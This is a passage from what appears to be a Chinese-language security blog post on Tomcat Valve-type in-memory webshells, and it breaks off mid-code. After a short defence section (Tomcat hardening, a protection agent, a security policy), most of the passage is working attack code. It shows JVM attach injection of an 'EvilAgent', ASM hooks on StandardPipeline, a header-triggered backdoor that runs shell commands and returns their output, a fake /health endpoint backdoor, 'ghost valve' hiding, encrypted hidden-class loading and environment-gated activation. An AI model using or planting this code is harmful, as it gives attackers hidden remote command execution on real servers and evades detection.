</span>...<br></code></pre></td></tr></table></figure></li></ol><p><strong>防御策略</strong></p><ol><li><p><strong>Tomcat配置加固</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- context.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveSecurityFilter&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">allowedValves</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.*&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>运行时保护机制</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValveProtectionAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer((loader, className, classBeingRedefined, <br>                protectionDomain, classfileBuffer) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org/apache/catalina/core/StandardPipeline&quot;</span>.equals(className)) &#123;<br>                <span class="hljs-keyword">return</span> patchPipelineClass(classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] patchPipelineClass(<span class="hljs-type">byte</span>[] original) &#123;<br>        <span class="hljs-comment">// 使用ASM添加管道修改检查</span><br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(original);<br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>        cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PipelineCheckAdapter</span>(cw), <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> cw.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>权限最小化</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 启动脚本添加JVM参数<br>-Djava.<span class="hljs-keyword">security</span>.manager \<br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>=tomcat.<span class="hljs-keyword">policy</span><br></code></pre></td></tr></table></figure><p><strong>tomcat.policy内容</strong>:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant codeBase <span class="hljs-string">&quot;file:$&#123;catalina.home&#125;/webapps/yourapp/-&quot;</span> &#123;<br>    // 禁止Valve修改权限<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;accessClassInPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="五、混合注入的演进趋势"><a href="#五、混合注入的演进趋势" class="headerlink" title="五、混合注入的演进趋势"></a>五、混合注入的演进趋势</h3><ol><li><p><strong>模块化加载</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-keyword">if</span> (isTriggerRequest(request)) &#123;<br>        <span class="hljs-comment">// 动态加载加密模块</span><br>        <span class="hljs-type">byte</span>[] encryptedModule = fetchModule(request.getParameter(<span class="hljs-string">&quot;m&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> loadModule(encryptedModule);<br>        executeModule(<span class="hljs-keyword">module</span>, request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    getNext().invoke(request, response);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>云环境适配</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 检测云环境并调整行为</span><br><span class="hljs-keyword">if</span> (isRunningInCloud()) &#123;<br>    activateCloudBackdoor();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    activateTraditionalBackdoor();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>API网关集成</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 伪装成合法的健康检查端点</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/health&quot;</span>.equals(request.getRequestURI())) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;action&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;exec&quot;</span>.equals(action)) &#123;<br>        executeCommand(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sendHealthStatus(response); <span class="hljs-comment">// 返回正常状态</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Tomcat Valve型内存马的混合注入方式代表了当前高级威胁的典型手法：</p><ol><li><strong>API与反射的精准结合</strong>- 在保持隐蔽性的同时提高可靠性</li><li><strong>上下文感知的攻击逻辑</strong>- 基于环境动态调整行为</li><li><strong>多层防御规避</strong>- 从类加载到管道操作全面伪装</li></ol><h2 id="Agent-ASM-Javassist-字节码注入"><a href="#Agent-ASM-Javassist-字节码注入" class="headerlink" title="Agent + ASM&#x2F;Javassist 字节码注入"></a>Agent + ASM&#x2F;Javassist 字节码注入</h2><h3 id="一、攻击流程详解"><a href="#一、攻击流程详解" class="headerlink" title="一、攻击流程详解"></a>一、攻击流程详解</h3><p><strong>阶段1：Agent注入（JVM渗透）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取目标Tomcat进程PID</span><br>List&lt;VirtualMachineDescriptor&gt; vms = VirtualMachine.list();<br><span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vms) &#123;<br>    <span class="hljs-keyword">if</span> (vmd.displayName().contains(<span class="hljs-string">&quot;catalina&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> vmd.id();<br>        <br>        <span class="hljs-comment">// 动态加载Agent</span><br>        <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>        vm.loadAgent(<span class="hljs-string">&quot;/path/to/agent.jar&quot;</span>, <span class="hljs-string">&quot;injection_params&quot;</span>);<br>        vm.detach();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>阶段2：Agent核心逻辑</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CriticalClassTransformer</span>());<br>    &#125;<br>    <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CriticalClassTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; TARGET_CLASSES = Set.of(<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span><br>        );<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                               Class&lt;?&gt; classBeingRedefined,<br>                               ProtectionDomain protectionDomain,<br>                               <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>            <br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotClassName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (TARGET_CLASSES.contains(dotClassName)) &#123;<br>                <span class="hljs-keyword">return</span> modifyClass(dotClassName, classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二、字节码修改技术（ASM核心实现）"><a href="#二、字节码修改技术（ASM核心实现）" class="headerlink" title="二、字节码修改技术（ASM核心实现）"></a>二、字节码修改技术（ASM核心实现）</h3><p><strong>1. StandardPipeline类修改</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] modifyStandardPipeline(<span class="hljs-type">byte</span>[] origBytecode) &#123;<br>    <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(origBytecode);<br>    <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>    <br>    cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, </span><br><span class="hljs-params">                                        String desc, String signature, </span><br><span class="hljs-params">                                        String[] exceptions)</span> &#123;<br>            <br>            <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>            <br>            <span class="hljs-comment">// 在invoke方法中植入钩子</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;invoke&quot;</span>.equals(name) &amp;&amp; <br>                <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>.equals(desc)) &#123;<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-comment">// 在方法开始处插入检测逻辑</span><br>                        mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 加载Request</span><br>                        mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                          <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                          <span class="hljs-string">&quot;checkRequest&quot;</span>, <br>                                          <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;)Z&quot;</span>, <br>                                          <span class="hljs-literal">false</span>);<br>                        <br>                        <span class="hljs-type">Label</span> <span class="hljs-variable">skipLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                        mv.visitJumpInsn(Opcodes.IFEQ, skipLabel);<br>                        <br>                        <span class="hljs-comment">// 如果是恶意请求，直接返回</span><br>                        mv.visitInsn(Opcodes.RETURN);<br>                        <br>                        mv.visitLabel(skipLabel);<br>                        <span class="hljs-built_in">super</span>.visitCode();<br>                    &#125;<br>                &#125;;<br>            &#125;<br>            <span class="hljs-keyword">return</span> mv;<br>        &#125;<br>    &#125;, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> cw.toByteArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. 嵌入式恶意逻辑类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// 请求检测逻辑</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>);<br>        <span class="hljs-keyword">if</span> (trigger != <span class="hljs-literal">null</span> &amp;&amp; trigger.startsWith(<span class="hljs-string">&quot;v1-&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> trigger.substring(<span class="hljs-number">3</span>);<br>            executeCommand(cmd, request.getResponse());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 命令执行逻辑（多平台兼容）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] commands;<br>            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            &#125;<br>            <br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(commands);<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                 <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter()) &#123;<br>                <br>                <span class="hljs-comment">// 流式传输结果</span><br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    writer.write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buffer, <span class="hljs-number">0</span>, bytesRead));<br>                &#125;<br>            &#125;<br>            p.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// 错误处理（不留栈轨迹）</span><br>            response.getWriter().write(<span class="hljs-string">&quot;ERROR: Command execution failed&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三、隐蔽性增强技术"><a href="#三、隐蔽性增强技术" class="headerlink" title="三、隐蔽性增强技术"></a>三、隐蔽性增强技术</h3><p><strong>1. 幽灵Valve技术</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 修改StandardPipeline的addValve方法</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String desc, </span><br><span class="hljs-params">                                String signature, String[] exceptions)</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;addValve&quot;</span>.equals(name) &amp;&amp; <br>        <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)V&quot;</span>.equals(desc)) &#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, <br>            <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions)) &#123;<br>            <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-comment">// 在添加Valve前进行检查</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 加载Valve参数</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;isGhostValve&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)Z&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                <br>                <span class="hljs-type">Label</span> <span class="hljs-variable">normalPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                mv.visitJumpInsn(Opcodes.IFEQ, normalPath);<br>                <br>                <span class="hljs-comment">// 幽灵Valve：不加入主数组，加入隐藏列表</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">0</span>);  <span class="hljs-comment">// this</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// Valve</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;addToGhostList&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/core/StandardPipeline;Lorg/apache/catalina/Valve;)V&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                mv.visitInsn(Opcodes.RETURN);<br>                <br>                mv.visitLabel(normalPath);<br>                <span class="hljs-built_in">super</span>.visitCode();<br>            &#125;<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. 动态代码解密</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// 加密的命令执行逻辑</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] ENCRYPTED_LOGIC = &#123;<span class="hljs-number">0x12</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x78</span>, ...&#125;;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 动态解密并执行</span><br>            <span class="hljs-type">byte</span>[] decrypted = decrypt(ENCRYPTED_LOGIC, getRuntimeKey());<br>            <span class="hljs-type">MethodHandle</span> <span class="hljs-variable">mh</span> <span class="hljs-operator">=</span> MethodHandles.lookup().defineHiddenClass(<br>                decrypted, <span class="hljs-literal">true</span>, MethodHandles.Lookup.ClassOption.NESTMATE)<br>                .findStatic(<span class="hljs-string">&quot;Stealth&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, MethodType.methodType(<span class="hljs-keyword">void</span>.class, String.class, Response.class));<br>            <br>            mh.invokeExact(cmd, response);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            <span class="hljs-comment">// 错误处理</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 基于环境动态生成密钥</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getRuntimeKey() &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">seed</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.name&quot;</span>) + <br>                      System.getenv(<span class="hljs-string">&quot;CATALINA_HOME&quot;</span>);<br>        <span class="hljs-keyword">return</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-256&quot;</span>)<br>            .digest(seed.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. 环境感知伪装</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// 仅在生产环境激活</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;production&quot;</span>.equals(System.getProperty(<span class="hljs-string">&quot;app.env&quot;</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 检查请求来源IP（仅允许内网）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">remoteAddr</span> <span class="hljs-operator">=</span> request.getRemoteAddr();<br>    <span class="hljs-keyword">if</span> (!remoteAddr.startsWith(<span class="hljs-string">&quot;192.168.&quot;</span>) &amp;&amp; <br>        !remoteAddr.startsWith(<span class="hljs-string">&quot;10.&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 检查请求时间（仅UTC 02:00-04:00激活）</span><br>    <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">&quot;UTC&quot;</span>));<br>    <span class="hljs-keyword">if</span> (now.getHour() &lt; <span class="hljs-number">2</span> || now.getHour() &gt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> 